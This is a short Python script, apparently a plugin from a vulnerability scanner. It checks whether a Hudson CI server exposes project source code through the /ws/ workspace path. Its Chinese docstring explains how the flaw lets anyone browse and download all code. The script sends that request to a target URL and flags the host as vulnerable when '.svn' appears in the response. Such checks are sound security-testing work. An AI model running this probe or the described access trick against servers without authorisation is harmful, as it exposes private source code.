#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: hudson源代码泄露漏洞
referer: http://www.wooyun.org/bugs/wooyun-2015-0103484
author: Lucifer
description: 一种新型的漏洞Hudson利用方式，不用破解密码，不用代码执行，直接查看任意代码。访问项目页面访问不到源代码,我们后面直接加入/ws/即可访问和下载所有代码。
'''
import sys
import warnings
import requests
from termcolor import cprint

class hudson_ws_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
        "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/hudson/job/crm/ws/"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r".svn" in req.text:
                cprint("[+]存在hudson源代码泄露漏洞...(中危)\tpayload: "+vulnurl, "yellow")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = hudson_ws_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()